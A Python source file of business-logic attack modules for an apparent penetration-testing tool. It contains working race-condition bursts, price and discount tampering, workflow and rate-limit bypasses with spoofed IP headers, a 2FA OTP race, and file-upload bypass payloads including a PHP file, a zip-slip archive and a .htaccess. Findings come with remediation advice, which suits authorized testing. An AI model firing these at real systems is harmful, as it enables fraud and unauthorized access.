"""
Business Logic attack modules — auto-discovered by ModuleRegistry.
Sprint 5: Race Condition, Price Manipulation, Workflow Bypass, Limit Bypass,
          Coupon Abuse, File Upload Logic, 2FA Race
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [BL-01] Race Condition Engine ───────────────────────────────────────────

class RaceConditionEngineModule(BaseModule):
    id = "BL-01"
    name = "Race Condition Engine"
    category = "business_logic"
    description = (
        "HTTP/2-style parallel burst attack: send N identical requests simultaneously "
        "to trigger TOCTOU race conditions on coupon redemption, vote, transfer, OTP, etc."
    )
    risk_level = "high"
    tags = ["race-condition", "toctou", "parallel-request", "coupon", "business-logic"]
    celery_queue = "business_logic_queue"
    time_limit = 900

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url", label="Target Endpoint URL", field_type="url",
                    required=True, placeholder="https://api.example.com/checkout/apply-coupon"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["POST", "GET", "PUT", "PATCH"], default="POST"),
        FieldSchema(key="request_body", label="Request Body (JSON)", field_type="json_editor",
                    required=False, placeholder='{"coupon_code":"DISCOUNT50","cart_id":"abc123"}'),
        FieldSchema(key="auth_header", label="Auth Header (key: value)", field_type="text",
                    required=False, sensitive=True, placeholder="Authorization: Bearer eyJ..."),
        FieldSchema(key="cookie", label="Session Cookie (name=value)", field_type="text",
                    required=False, sensitive=True),
        FieldSchema(key="concurrency", label="Parallel Requests", field_type="number",
                    default=20, min_value=2, max_value=100),
        FieldSchema(key="rounds", label="Repeat Rounds", field_type="number",
                    default=3, min_value=1, max_value=10),
        FieldSchema(key="success_indicator", label="Success Response Indicator",
                    field_type="text", required=False, placeholder="coupon_applied"),
        FieldSchema(key="check_duplicates", label="Flag duplicate success if count > 1",
                    field_type="select", options=["yes", "no"], default="yes"),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, json, concurrent.futures, time
        import urllib3; urllib3.disable_warnings()

        target_url = params["target_url"]
        method = (params.get("method") or "POST").upper()
        req_body = params.get("request_body") or {}
        if isinstance(req_body, str):
            try:
                req_body = json.loads(req_body)
            except Exception:
                req_body = {}
        auth_header = params.get("auth_header") or ""
        cookie_str = params.get("cookie") or ""
        concurrency = int(params.get("concurrency", 20))
        rounds = int(params.get("rounds", 3))
        success_str = params.get("success_indicator") or ""
        check_dupes = params.get("check_duplicates", "yes") == "yes"

        headers = {"User-Agent": "PenTools/1.0", "Content-Type": "application/json"}
        if auth_header and ":" in auth_header:
            k, v = auth_header.split(":", 1)
            headers[k.strip()] = v.strip()

        cookies = {}
        if cookie_str and "=" in cookie_str:
            ck, cv = cookie_str.split("=", 1)
            cookies[ck.strip()] = cv.strip()

        findings = []

        def fire_request(session):
            try:
                meth_fn = getattr(session, method.lower())
                return meth_fn(target_url, json=req_body, headers=headers, timeout=10)
            except Exception:
                return None

        all_round_results = []

        for rnd in range(rounds):
            stream(f"[BL-01] Round {rnd + 1}/{rounds} — firing {concurrency} parallel requests...")
            sessions = []
            for _ in range(concurrency):
                s = requests.Session()
                s.verify = False
                s.cookies.update(cookies)
                sessions.append(s)

            with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
                futs = [executor.submit(fire_request, s) for s in sessions]
                responses = [f.result() for f in concurrent.futures.as_completed(futs)]

            statuses = [r.status_code for r in responses if r is not None]
            success_count = 0
            for r in responses:
                if r is None:
                    continue
                if success_str and success_str in r.text:
                    success_count += 1
                elif not success_str and r.status_code in (200, 201):
                    success_count += 1

            all_round_results.append((rnd + 1, success_count, statuses))
            stream(f"[BL-01] Round {rnd + 1}: {success_count}/{concurrency} accepted, statuses: {sorted(set(statuses))}")
            time.sleep(0.5)

        # Evaluate results
        max_successes = max(r[1] for r in all_round_results) if all_round_results else 0
        if check_dupes and max_successes > 1:
            best_round = max(all_round_results, key=lambda x: x[1])
            findings.append({
                "title": "Race Condition — Multiple Simultaneous Requests Accepted",
                "severity": "high",
                "url": target_url,
                "description": (
                    f"In round {best_round[0]}, {best_round[1]} out of {concurrency} parallel "
                    "requests were accepted as successful. This indicates a TOCTOU (Time-Of-Check "
                    "to Time-Of-Use) race condition vulnerability."
                ),
                "evidence": (
                    "Round " + str(best_round[0]) + ": " + str(best_round[1]) + "/" + str(concurrency)
                    + " parallel requests accepted."
                ),
                "remediation": (
                    "Use database-level atomic operations (SELECT FOR UPDATE, optimistic locking). "
                    "Implement idempotency tokens. Use Redis distributed locks for critical operations."
                ),
                "cwe_id": "CWE-362",
            })
        elif max_successes == 0:
            stream("[BL-01] No success responses observed during race testing.")
        else:
            stream("[BL-01] Only single acceptance per round — no race condition detected.")

        return {"status": "done", "findings": findings}


# ─── [BL-02] Price / Value Manipulation ──────────────────────────────────────

class PriceManipulationModule(BaseModule):
    id = "BL-02"
    name = "Price / Value Manipulation"
    category = "business_logic"
    description = (
        "Test for price/value manipulation: negative amounts, zero price, "
        "integer overflow, currency override, and discount stacking."
    )
    risk_level = "high"
    tags = ["business-logic", "price-manipulation", "negative-value", "overflow"]
    celery_queue = "business_logic_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="checkout_url", label="Purchase/Checkout Endpoint", field_type="url",
                    required=True, placeholder="https://shop.example.com/api/order"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["POST", "PUT", "PATCH"], default="POST"),
        FieldSchema(key="base_body", label="Normal Order Body (JSON)", field_type="json_editor",
                    required=True,
                    placeholder='{"item_id":"prod_123","quantity":1,"price":99.99,"currency":"USD"}'),
        FieldSchema(key="price_field", label="Price Field Name", field_type="text",
                    default="price", required=False),
        FieldSchema(key="quantity_field", label="Quantity Field Name", field_type="text",
                    default="quantity", required=False),
        FieldSchema(key="auth_header", label="Auth Header", field_type="text",
                    required=False, sensitive=True),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, json
        import urllib3; urllib3.disable_warnings()

        checkout_url = params["checkout_url"]
        method = (params.get("method") or "POST").upper()
        base_body = params.get("base_body") or {}
        if isinstance(base_body, str):
            try:
                base_body = json.loads(base_body)
            except Exception:
                base_body = {}
        price_field = params.get("price_field") or "price"
        qty_field = params.get("quantity_field") or "quantity"
        auth_header = params.get("auth_header") or ""

        headers = {"User-Agent": "PenTools/1.0", "Content-Type": "application/json"}
        if auth_header and ":" in auth_header:
            k, v = auth_header.split(":", 1)
            headers[k.strip()] = v.strip()

        session = requests.Session()
        session.verify = False
        findings = []
        meth_fn = getattr(session, method.lower())

        # Test vectors: (field, value, label, severity)
        test_cases = [
            (price_field, -1,           "Negative Price",          "critical"),
            (price_field, 0,            "Zero Price",              "critical"),
            (price_field, 0.001,        "Fractional/Near-Zero",    "high"),
            (price_field, 999999999,    "Integer Overflow Price",  "medium"),
            (qty_field,   -1,           "Negative Quantity",       "critical"),
            (qty_field,   0,            "Zero Quantity",           "high"),
            (qty_field,   99999,        "Excessive Quantity",      "medium"),
            ("currency",  "XXX",        "Invalid Currency Code",   "low"),
            ("discount",  100,          "100% Discount Injection", "high"),
        ]

        stream(f"[BL-02] Testing {len(test_cases)} price manipulation vectors at {checkout_url}...")

        for field, val, label, sev in test_cases:
            body = dict(base_body)
            body[field] = val
            try:
                r = meth_fn(checkout_url, json=body, headers=headers, timeout=10)
                if r.status_code in (200, 201, 202):
                    findings.append({
                        "title": "Price Manipulation Accepted: " + label,
                        "severity": sev,
                        "url": checkout_url,
                        "description": (
                            f"Setting '{field}' = {val} returned HTTP {r.status_code}. "
                            f"The server accepted the {label} without rejection."
                        ),
                        "evidence": "Body: " + json.dumps(body)[:100] + " → " + str(r.status_code),
                        "remediation": (
                            "Validate all numeric fields server-side. Reject negative, zero, or "
                            "out-of-range values. Never trust client-supplied prices — always fetch "
                            "from the catalog."
                        ),
                        "cwe_id": "CWE-20",
                    })
                    stream("[BL-02] Vulnerable: " + label)
            except Exception as e:
                stream(f"[BL-02] {label} error: {e}")

        return {"status": "done", "findings": findings}


# ─── [BL-03] Workflow Step Bypass ─────────────────────────────────────────────

class WorkflowStepBypassModule(BaseModule):
    id = "BL-03"
    name = "Workflow Step Bypass"
    category = "business_logic"
    description = (
        "Test if multi-step workflows can be bypassed by directly accessing "
        "later steps (payment, verification, completion) without prerequisites."
    )
    risk_level = "high"
    tags = ["business-logic", "workflow-bypass", "step-skip", "forced-browse"]
    celery_queue = "business_logic_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="base_url", label="Application Base URL", field_type="url",
                    required=True, placeholder="https://shop.example.com"),
        FieldSchema(key="workflow_steps", label="Workflow Steps (path per line, in order)",
                    field_type="textarea", required=True,
                    placeholder="/checkout/cart\n/checkout/address\n/checkout/payment\n/checkout/confirm"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["GET", "POST"], default="GET"),
        FieldSchema(key="auth_header", label="Auth Header", field_type="text",
                    required=False, sensitive=True),
        FieldSchema(key="session_cookie", label="Session Cookie (name=value)", field_type="text",
                    required=False, sensitive=True),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3; urllib3.disable_warnings()

        base_url = (params.get("base_url") or "").rstrip("/")
        steps_raw = params.get("workflow_steps") or ""
        method = (params.get("method") or "GET").upper()
        auth_header = params.get("auth_header") or ""
        cookie_str = params.get("session_cookie") or ""

        steps = [s.strip() for s in steps_raw.splitlines() if s.strip()]
        headers = {"User-Agent": "PenTools/1.0"}
        if auth_header and ":" in auth_header:
            k, v = auth_header.split(":", 1)
            headers[k.strip()] = v.strip()

        cookies = {}
        if cookie_str and "=" in cookie_str:
            ck, cv = cookie_str.split("=", 1)
            cookies[ck.strip()] = cv.strip()

        session = requests.Session()
        session.verify = False
        session.cookies.update(cookies)
        findings = []

        if len(steps) < 2:
            return {"status": "failed", "findings": [], "raw_output": "Need at least 2 workflow steps."}

        stream(f"[BL-03] Testing {len(steps)} workflow steps for bypass at {base_url}...")

        # Attempt to access steps 2+ directly (skipping any prerequisite steps)
        for i, step in enumerate(steps[1:], start=1):
            url = base_url + step
            try:
                meth_fn = getattr(session, method.lower())
                r = meth_fn(url, headers=headers, timeout=10)
                stream(f"[BL-03] Direct access step {i+1} ({step}): {r.status_code}")

                if r.status_code in (200, 201):
                    sev = "critical" if i >= len(steps) - 1 else "high"  # Final step = critical
                    findings.append({
                        "title": f"Workflow Step Bypass: Direct Access to Step {i+1}",
                        "severity": sev,
                        "url": url,
                        "description": (
                            f"Step {i+1} ('{step}') is accessible directly without completing "
                            f"preceding steps. Workflow: {' → '.join(steps)}"
                        ),
                        "evidence": f"Direct {method} {url} returned {r.status_code}.",
                        "remediation": (
                            "Track workflow state server-side. Verify prerequisite completion before "
                            "allowing access to subsequent steps. Use server-side session state."
                        ),
                        "cwe_id": "CWE-840",
                    })
            except Exception as e:
                stream(f"[BL-03] Step {i+1} error: {e}")

        return {"status": "done", "findings": findings}


# ─── [BL-04] Limit Bypass ─────────────────────────────────────────────────────

class LimitBypassModule(BaseModule):
    id = "BL-04"
    name = "Limit Bypass"
    category = "business_logic"
    description = (
        "Test per-user/per-account limits by attempting to exceed them "
        "via parameter manipulation, duplicate IDs, or rapid sequential requests."
    )
    risk_level = "high"
    tags = ["business-logic", "limit-bypass", "rate-limit", "quantity-limit"]
    celery_queue = "business_logic_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="limit_endpoint", label="Rate/Limit-Enforced Endpoint URL",
                    field_type="url", required=True,
                    placeholder="https://api.example.com/api/vote"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["POST", "GET", "PUT"], default="POST"),
        FieldSchema(key="request_body", label="Request Body (JSON)", field_type="json_editor",
                    required=False),
        FieldSchema(key="auth_header", label="Auth Header", field_type="text",
                    required=False, sensitive=True),
        FieldSchema(key="limit_attempts", label="Attempts to make (to exceed limit)",
                    field_type="number", default=10, min_value=2, max_value=50),
        FieldSchema(key="bypass_techniques", label="Bypass Techniques",
                    field_type="checkbox_group",
                    default=["sequential", "xff"],
                    options=[
                        {"value": "sequential", "label": "Sequential rapid requests"},
                        {"value": "xff",        "label": "X-Forwarded-For IP spoof"},
                        {"value": "id_dupe",    "label": "Duplicate ID in body"},
                    ]),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, json, random, time
        import urllib3; urllib3.disable_warnings()

        endpoint = params["limit_endpoint"]
        method = (params.get("method") or "POST").upper()
        req_body = params.get("request_body") or {}
        if isinstance(req_body, str):
            try:
                req_body = json.loads(req_body)
            except Exception:
                req_body = {}
        auth_header = params.get("auth_header") or ""
        limit_attempts = int(params.get("limit_attempts", 10))
        bypasses = params.get("bypass_techniques", ["sequential"])

        base_headers = {"User-Agent": "PenTools/1.0", "Content-Type": "application/json"}
        if auth_header and ":" in auth_header:
            k, v = auth_header.split(":", 1)
            base_headers[k.strip()] = v.strip()

        session = requests.Session()
        session.verify = False
        findings = []

        def send(h, body):
            try:
                fn = getattr(session, method.lower())
                return fn(endpoint, json=body, headers=h, timeout=8)
            except Exception:
                return None

        if "sequential" in bypasses:
            stream(f"[BL-04] Sending {limit_attempts} sequential requests to detect limit...")
            accepted = 0
            for i in range(limit_attempts):
                r = send(base_headers, req_body)
                if r and r.status_code in (200, 201):
                    accepted += 1
            stream(f"[BL-04] {accepted}/{limit_attempts} sequential requests accepted.")
            if accepted == limit_attempts:
                findings.append({
                    "title": "No Per-Action Limit Enforced",
                    "severity": "medium",
                    "url": endpoint,
                    "description": (
                        f"All {limit_attempts} sequential requests to a limit-enforced endpoint "
                        "were accepted without rejection or throttling."
                    ),
                    "evidence": str(accepted) + "/" + str(limit_attempts) + " requests accepted.",
                    "remediation": "Implement server-side per-user action limits with persistent tracking.",
                    "cwe_id": "CWE-799",
                })

        if "xff" in bypasses:
            stream("[BL-04] Testing limit bypass via X-Forwarded-For rotation...")
            bypass_count = 0
            for _ in range(min(limit_attempts, 10)):
                fake_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
                h = dict(base_headers)
                h["X-Forwarded-For"] = fake_ip
                r = send(h, req_body)
                if r and r.status_code in (200, 201):
                    bypass_count += 1
            if bypass_count > 1:
                findings.append({
                    "title": "Limit Bypass via X-Forwarded-For IP Spoofing",
                    "severity": "high",
                    "url": endpoint,
                    "description": f"{bypass_count} requests bypassed limits using spoofed IPs.",
                    "evidence": str(bypass_count) + " requests accepted with rotating X-Forwarded-For.",
                    "remediation": "Use authenticated user ID (not IP) for limit tracking. Never trust client-supplied IP headers.",
                    "cwe_id": "CWE-290",
                })

        return {"status": "done", "findings": findings}


# ─── [BL-05] Coupon / Promo Abuse ────────────────────────────────────────────

class CouponPromoAbuseModule(BaseModule):
    id = "BL-05"
    name = "Coupon / Promo Abuse"
    category = "business_logic"
    description = (
        "Test coupon/promo code endpoints for: single-use bypass via race condition, "
        "discount stacking, negative discount values, and code enumeration."
    )
    risk_level = "high"
    tags = ["business-logic", "coupon-abuse", "promo", "race-condition", "discount"]
    celery_queue = "business_logic_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="coupon_endpoint", label="Coupon Apply Endpoint URL", field_type="url",
                    required=True, placeholder="https://shop.example.com/api/cart/coupon"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["POST", "PUT"], default="POST"),
        FieldSchema(key="coupon_code", label="Valid Coupon Code to Test", field_type="text",
                    required=True, placeholder="DISCOUNT50"),
        FieldSchema(key="coupon_field", label="Coupon Field Name in Body", field_type="text",
                    default="coupon_code"),
        FieldSchema(key="extra_body", label="Extra Body Fields (JSON)", field_type="json_editor",
                    required=False),
        FieldSchema(key="auth_header", label="Auth Header", field_type="text",
                    required=False, sensitive=True),
        FieldSchema(key="race_threads", label="Parallel threads for race test", field_type="number",
                    default=15, min_value=2, max_value=50),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, json, concurrent.futures
        import urllib3; urllib3.disable_warnings()

        endpoint = params["coupon_endpoint"]
        method = (params.get("method") or "POST").upper()
        coupon_code = params.get("coupon_code", "TESTCOUPON") or "TESTCOUPON"
        coupon_field = params.get("coupon_field", "coupon_code") or "coupon_code"
        extra_body = params.get("extra_body") or {}
        if isinstance(extra_body, str):
            try:
                extra_body = json.loads(extra_body)
            except Exception:
                extra_body = {}
        auth_header = params.get("auth_header") or ""
        race_threads = int(params.get("race_threads", 15))

        headers = {"User-Agent": "PenTools/1.0", "Content-Type": "application/json"}
        if auth_header and ":" in auth_header:
            k, v = auth_header.split(":", 1)
            headers[k.strip()] = v.strip()

        findings = []

        # Test 1: Race condition — apply same coupon N times simultaneously
        stream(f"[BL-05] Race condition: applying coupon {race_threads}x in parallel...")

        def apply_coupon():
            s = requests.Session()
            s.verify = False
            body = {coupon_field: coupon_code}
            body.update(extra_body)
            try:
                fn = getattr(s, method.lower())
                return fn(endpoint, json=body, headers=headers, timeout=10)
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=race_threads) as executor:
            futs = [executor.submit(apply_coupon) for _ in range(race_threads)]
            responses = [f.result() for f in concurrent.futures.as_completed(futs)]

        success_count = sum(
            1 for r in responses if r and r.status_code in (200, 201)
        )
        stream(f"[BL-05] Parallel coupon apply: {success_count}/{race_threads} accepted.")

        if success_count > 1:
            findings.append({
                "title": "Coupon Race Condition — Single-Use Code Applied Multiple Times",
                "severity": "high",
                "url": endpoint,
                "description": (
                    f"A single-use coupon code was applied {success_count} times "
                    "in parallel, indicating a TOCTOU race condition in coupon validation."
                ),
                "evidence": str(success_count) + "/" + str(race_threads) + " simultaneous applications accepted.",
                "remediation": (
                    "Use atomic DB operations (UPDATE ... WHERE used=false RETURNING id). "
                    "Use Redis SET NX for distributed idempotency. "
                    "Mark coupon as used in the same transaction as the order."
                ),
                "cwe_id": "CWE-362",
            })

        # Test 2: Negative discount value
        stream("[BL-05] Testing negative discount injection...")
        session2 = requests.Session()
        session2.verify = False
        neg_body = {coupon_field: coupon_code, "discount": -50, "discount_percent": -100}
        neg_body.update(extra_body)
        try:
            fn = getattr(session2, method.lower())
            r = fn(endpoint, json=neg_body, headers=headers, timeout=10)
            if r.status_code in (200, 201):
                findings.append({
                    "title": "Negative Discount Value Accepted",
                    "severity": "high",
                    "url": endpoint,
                    "description": "Injecting a negative discount value was accepted, potentially increasing the order total or crediting the account.",
                    "evidence": "discount=-50 → " + str(r.status_code),
                    "remediation": "Validate all discount/price fields are non-negative. Use server-side coupon lookup only.",
                    "cwe_id": "CWE-20",
                })
        except Exception:
            pass

        return {"status": "done", "findings": findings}


# ─── [BL-06] File Upload Logic Bypass ────────────────────────────────────────

class FileUploadLogicBypassModule(BaseModule):
    id = "BL-06"
    name = "File Upload Logic Bypass"
    category = "business_logic"
    description = (
        "Test file upload controls for logic bypasses: extension whitelist bypass, "
        "MIME type spoofing, zip slip, and path traversal in filenames."
    )
    risk_level = "high"
    tags = ["business-logic", "file-upload", "extension-bypass", "zip-slip", "path-traversal"]
    celery_queue = "business_logic_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="upload_url", label="File Upload Endpoint", field_type="url",
                    required=True, placeholder="https://example.com/api/upload"),
        FieldSchema(key="upload_field", label="File Input Field Name", field_type="text",
                    default="file"),
        FieldSchema(key="auth_header", label="Auth Header", field_type="text",
                    required=False, sensitive=True),
        FieldSchema(key="attacks", label="Bypass Techniques",
                    field_type="checkbox_group",
                    default=["double_ext", "mime_spoof", "null_byte"],
                    options=[
                        {"value": "double_ext",   "label": "Double extension (shell.php.jpg)"},
                        {"value": "mime_spoof",   "label": "MIME type spoofing (PHP with image MIME)"},
                        {"value": "null_byte",    "label": "Null byte truncation (shell.php%00.jpg)"},
                        {"value": "zip_slip",     "label": "Zip slip (path traversal in archive)"},
                        {"value": "htaccess",     "label": ".htaccess upload → PHP execution"},
                    ]),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, io, zipfile
        import urllib3; urllib3.disable_warnings()

        upload_url = params["upload_url"]
        file_field = params.get("upload_field") or "file"
        auth_header = params.get("auth_header") or ""
        attacks = params.get("attacks", ["double_ext", "mime_spoof", "null_byte"])

        headers = {"User-Agent": "PenTools/1.0"}
        if auth_header and ":" in auth_header:
            k, v = auth_header.split(":", 1)
            headers[k.strip()] = v.strip()

        session = requests.Session()
        session.verify = False
        findings = []

        php_payload = b"<?php echo 'PENTOOLS_LOGIC_BYPASS'; phpinfo(); ?>"

        if "double_ext" in attacks:
            stream("[BL-06] Testing double extension bypass...")
            files = {file_field: ("shell.php.jpg", php_payload, "image/jpeg")}
            try:
                r = session.post(upload_url, files=files, headers=headers, timeout=10)
                if r.status_code in (200, 201):
                    resp_lower = r.text.lower()
                    if "success" in resp_lower or "uploaded" in resp_lower or "url" in resp_lower:
                        findings.append({
                            "title": "File Upload — Double Extension Bypass",
                            "severity": "high",
                            "url": upload_url,
                            "description": "File 'shell.php.jpg' was accepted. If executed, PHP server-side code could run.",
                            "evidence": "shell.php.jpg → " + str(r.status_code) + " — " + r.text[:100],
                            "remediation": "Validate the final extension only. Rename uploaded files. Store outside webroot.",
                            "cwe_id": "CWE-434",
                        })
            except Exception as e:
                stream(f"[BL-06] double_ext error: {e}")

        if "mime_spoof" in attacks:
            stream("[BL-06] Testing MIME type spoofing...")
            files = {file_field: ("shell.php", php_payload, "image/png")}
            try:
                r = session.post(upload_url, files=files, headers=headers, timeout=10)
                if r.status_code in (200, 201) and any(
                    kw in r.text.lower() for kw in ("success", "uploaded", "url")
                ):
                    findings.append({
                        "title": "File Upload — MIME Type Bypass (PHP with image/png)",
                        "severity": "high",
                        "url": upload_url,
                        "description": "PHP file accepted with image/png MIME type. Server relies on MIME header instead of true content.",
                        "evidence": "shell.php (MIME: image/png) → " + str(r.status_code),
                        "remediation": "Validate file type via magic bytes (libmagic), not Content-Type header.",
                        "cwe_id": "CWE-434",
                    })
            except Exception as e:
                stream(f"[BL-06] mime_spoof error: {e}")

        if "null_byte" in attacks:
            stream("[BL-06] Testing null byte truncation...")
            files = {file_field: ("shell.php\x00.jpg", php_payload, "image/jpeg")}
            try:
                r = session.post(upload_url, files=files, headers=headers, timeout=10)
                if r.status_code in (200, 201):
                    findings.append({
                        "title": "File Upload — Null Byte Truncation Upload",
                        "severity": "medium",
                        "url": upload_url,
                        "description": "Null byte in filename was accepted. Old PHP/C-based servers may truncate at \\x00, treating filename as shell.php.",
                        "evidence": "shell.php\\x00.jpg → " + str(r.status_code),
                        "remediation": "Strip null bytes from filenames. Use a UUID-based filename on storage.",
                        "cwe_id": "CWE-626",
                    })
            except Exception as e:
                stream(f"[BL-06] null_byte error: {e}")

        if "zip_slip" in attacks:
            stream("[BL-06] Testing zip slip...")
            try:
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, "w") as zf:
                    zf.writestr("../../../../tmp/pentools_zipslip.txt", "PENTOOLS_ZIP_SLIP_TEST")
                buf.seek(0)
                files = {file_field: ("archive.zip", buf.read(), "application/zip")}
                r = session.post(upload_url, files=files, headers=headers, timeout=10)
                if r.status_code in (200, 201):
                    findings.append({
                        "title": "File Upload — Zip Slip (Path Traversal in Archive)",
                        "severity": "high",
                        "url": upload_url,
                        "description": (
                            "A zip archive with path traversal entries (../../../../tmp/...) was accepted. "
                            "If extracted without sanitization, files may be written outside intended directories."
                        ),
                        "evidence": "archive.zip with traversal path → " + str(r.status_code),
                        "remediation": (
                            "Sanitize all archive entry names before extraction. "
                            "Reject entries with '..' or absolute paths. "
                            "Use ZipInputStream with canonical path validation."
                        ),
                        "cwe_id": "CWE-22",
                    })
            except Exception as e:
                stream(f"[BL-06] zip_slip error: {e}")

        if "htaccess" in attacks:
            stream("[BL-06] Testing .htaccess upload...")
            htaccess_content = b"AddType application/x-httpd-php .jpg\n"
            files = {file_field: (".htaccess", htaccess_content, "text/plain")}
            try:
                r = session.post(upload_url, files=files, headers=headers, timeout=10)
                if r.status_code in (200, 201):
                    findings.append({
                        "title": "File Upload — .htaccess Upload Accepted",
                        "severity": "critical",
                        "url": upload_url,
                        "description": (
                            "A .htaccess file was accepted. If served from an Apache webroot, "
                            "attackers can enable PHP execution for arbitrary extensions."
                        ),
                        "evidence": ".htaccess → " + str(r.status_code),
                        "remediation": "Deny upload of .htaccess and all dot-files. Validate filename against a strict allowlist.",
                        "cwe_id": "CWE-434",
                    })
            except Exception as e:
                stream(f"[BL-06] htaccess error: {e}")

        return {"status": "done", "findings": findings}


# ─── [BL-07] 2FA Race Condition ───────────────────────────────────────────────

class TwoFARaceConditionModule(BaseModule):
    id = "BL-07"
    name = "2FA Race Condition"
    category = "business_logic"
    description = (
        "Test 2FA OTP validation for race conditions by submitting the same code "
        "from multiple parallel sessions simultaneously."
    )
    risk_level = "high"
    tags = ["business-logic", "2fa", "mfa", "race-condition", "otp"]
    celery_queue = "business_logic_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(key="otp_endpoint", label="2FA OTP Validation Endpoint", field_type="url",
                    required=True, placeholder="https://example.com/api/auth/2fa"),
        FieldSchema(key="otp_code", label="Valid OTP Code (just obtained)", field_type="text",
                    required=True, placeholder="123456"),
        FieldSchema(key="otp_field", label="OTP Field Name", field_type="text", default="otp"),
        FieldSchema(key="session_tokens", label="Multiple Session Tokens (one per line)",
                    field_type="textarea", required=False, sensitive=True,
                    placeholder="eyJhbGciOi...session1\neyJhbGciOi...session2"),
        FieldSchema(key="parallel_count", label="Parallel Requests", field_type="number",
                    default=10, min_value=2, max_value=50),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, concurrent.futures
        import urllib3; urllib3.disable_warnings()

        endpoint = params["otp_endpoint"]
        otp_code = str(params.get("otp_code", "123456") or "123456")
        otp_field = params.get("otp_field", "otp") or "otp"
        tokens_raw = params.get("session_tokens") or ""
        parallel = int(params.get("parallel_count", 10))

        tokens = [t.strip() for t in tokens_raw.splitlines() if t.strip()]
        findings = []

        def submit_otp(token_idx):
            s = requests.Session()
            s.verify = False
            h = {"User-Agent": "PenTools/1.0", "Content-Type": "application/json"}
            if tokens and token_idx < len(tokens):
                h["Authorization"] = "Bearer " + tokens[token_idx]
            elif tokens:
                h["Authorization"] = "Bearer " + tokens[0]
            try:
                r = s.post(endpoint, json={otp_field: otp_code}, headers=h, timeout=8)
                return r
            except Exception:
                return None

        stream(f"[BL-07] Testing 2FA race condition with {parallel} parallel submissions of OTP {otp_code}...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=parallel) as executor:
            futs = [executor.submit(submit_otp, i) for i in range(parallel)]
            results = [f.result() for f in concurrent.futures.as_completed(futs)]

        success_count = sum(
            1 for r in results if r and r.status_code == 200 and any(
                kw in r.text.lower() for kw in ("success", "verified", "token", "access", "logged")
            )
        )

        stream(f"[BL-07] {success_count}/{parallel} parallel 2FA submissions accepted.")

        if success_count > 1:
            findings.append({
                "title": "2FA Race Condition — OTP Accepted Multiple Times in Parallel",
                "severity": "high",
                "url": endpoint,
                "description": (
                    f"Submitting the same OTP code {parallel} times in parallel resulted in "
                    f"{success_count} successful validations. This race condition can allow an "
                    "attacker to use a single leaked OTP code across multiple sessions."
                ),
                "evidence": str(success_count) + "/" + str(parallel) + " parallel submissions accepted OTP " + otp_code,
                "remediation": (
                    "Use atomic OTP invalidation: mark as used in the same transaction as validation. "
                    "Use SELECT FOR UPDATE or Redis SET NX with TTL. "
                    "Implement per-OTP usage counter with strict 1-use enforcement."
                ),
                "cwe_id": "CWE-362",
            })
        elif success_count == 0:
            stream("[BL-07] No successful OTP validations — code may be invalid or expired.")
        else:
            stream("[BL-07] Single acceptance only — no race condition detected.")

        return {"status": "done", "findings": findings}


# ─── [BL-08] Account / Balance Exploit ───────────────────────────────────────

class AccountBalanceExploitModule(BaseModule):
    id = "BL-08"
    name = "Account & Balance Exploit"
    category = "business_logic"
    description = (
        "Test financial transaction endpoints for negative amount transfers, "
        "integer overflow, double-spend via race conditions, and balance bypass. "
        "Detects business logic flaws in payment, credit, and transfer workflows."
    )
    risk_level = "critical"
    tags = ["business_logic", "finance", "race", "negative", "overflow", "transfer"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(key="transfer_url",   label="Transfer / Payment Endpoint URL",  field_type="url",  required=True,
                    placeholder="https://example.com/api/transfer"),
        FieldSchema(key="balance_url",    label="Balance Check URL",  field_type="url",  required=False,
                    placeholder="https://example.com/api/account/balance"),
        FieldSchema(key="auth_header",    label="Authorization (victim session)",   field_type="text", required=True),
        FieldSchema(
            key="attacks",
            label="Attack Types",
            field_type="checkbox_group",
            default=["negative_amount", "race_condition", "integer_overflow"],
            options=[
                {"value": "negative_amount",   "label": "Negative amount transfer"},
                {"value": "zero_amount",        "label": "Zero-value transfer"},
                {"value": "integer_overflow",   "label": "Integer overflow (MAX_INT)"},
                {"value": "race_condition",     "label": "Race condition (concurrent transfers)"},
                {"value": "float_epsilon",      "label": "Float epsilon abuse (0.000001 transfers)"},
            ],
        ),
        FieldSchema(key="amount_field",   label="Amount field name",  field_type="text",  default="amount"),
        FieldSchema(key="from_field",     label="'From' account field name",   field_type="text",  default="from_account"),
        FieldSchema(key="to_field",       label="'To' account field name",    field_type="text",  default="to_account"),
        FieldSchema(key="from_account",   label="Source account ID / value",  field_type="text",  required=False),
        FieldSchema(key="to_account",     label="Destination account ID",      field_type="text",  required=False),
        FieldSchema(key="race_threads",   label="Race condition threads",      field_type="number", default=10),
        FieldSchema(key="content_type",   label="Content-Type",  field_type="select", default="application/json",
                    options=[
                        {"value": "application/json",                "label": "JSON"},
                        {"value": "application/x-www-form-urlencoded", "label": "Form URL-encoded"},
                    ]),
    ]

